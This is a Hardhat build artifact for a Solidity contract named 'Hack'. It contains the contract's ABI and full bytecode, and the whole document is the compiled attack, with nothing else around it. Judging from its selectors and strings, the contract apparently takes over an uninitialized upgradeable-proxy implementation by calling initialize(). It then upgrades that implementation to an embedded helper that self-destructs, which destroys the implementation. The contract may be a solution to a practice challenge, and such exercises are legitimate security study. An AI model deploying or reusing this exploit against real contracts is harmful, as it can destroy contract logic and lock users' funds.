{
  "_format": "hh-sol-artifact-1",
  "contractName": "Hack",
  "sourceName": "contracts/Hack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_logic",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "callinitialize",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "result",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "setmaliciousImp",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516109493803806109498339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506108b5806100946000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806306d8c4481461004657806365372147146100505780638e074be314610072575b600080fd5b61004e610094565b005b610058610265565b604051808215151515815260200191505060405180910390f35b61007a610278565b604051808215151515815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f8129fc1c000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101845780518252602082019150602081019050602083039250610161565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101e6576040519150601f19603f3d011682016040523d82523d6000602084013e6101eb565b606091505b5050905080610262576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260158152602001807f696e6974616c697a652063616c6c206661696c6564000000000000000000000081525060200191505060405180910390fd5b50565b600060149054906101000a900460ff1681565b600080604051610287906107ab565b604051809103906000f0801580156102a3573d6000803e3d6000fd5b5090506104796000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16826040516024016040516020818303038152906040527f8129fc1c000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051602401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200180602001828103825283818151815260200191508051906020019080838360005b838110156103c45780820151818401526020810190506103a9565b50505050905090810190601f1680156103f15780820380516001836020036101000a031916815260200191505b5093505050506040516020818303038152906040527f4f1ef286000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506104c1565b506104a46000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1661050b565b600060146101000a81548160ff0219169083151502179055505090565b606061050383836040518060400160405280601e81526020017f416464726573733a206c6f772d6c6576656c2063616c6c206661696c6564000081525061051e565b905092915050565b600080823b905060008111915050919050565b606061052d8484600085610536565b90509392505050565b606082471015610591576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602681526020018061085a6026913960400191505060405180910390fd5b61059a8561050b565b61060c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f416464726573733a2063616c6c20746f206e6f6e2d636f6e747261637400000081525060200191505060405180910390fd5b600060608673ffffffffffffffffffffffffffffffffffffffff1685876040518082805190602001908083835b6020831061065c5780518252602082019150602081019050602083039250610639565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146106be576040519150601f19603f3d011682016040523d82523d6000602084013e6106c3565b606091505b50915091506106d38282866106df565b92505050949350505050565b606083156106ef578290506107a4565b6000835111156107025782518084602001fd5b816040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561076957808201518184015260208101905061074e565b50505050905090810190601f1680156107965780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b9392505050565b60a2806107b88339019056fe6080604052348015600f57600080fd5b5060848061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80638129fc1c14602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220b5b5794bec122085dbe6bb1e44e1bc66b9a50f0eb0c2b470e0a82c0435210b7564736f6c63430006090033416464726573733a20696e73756666696369656e742062616c616e636520666f722063616c6ca26469706673582212207acdf4d58f387331ba2070ddc6e6d55653690f73a6b6b42a61fa582117855de264736f6c63430006090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}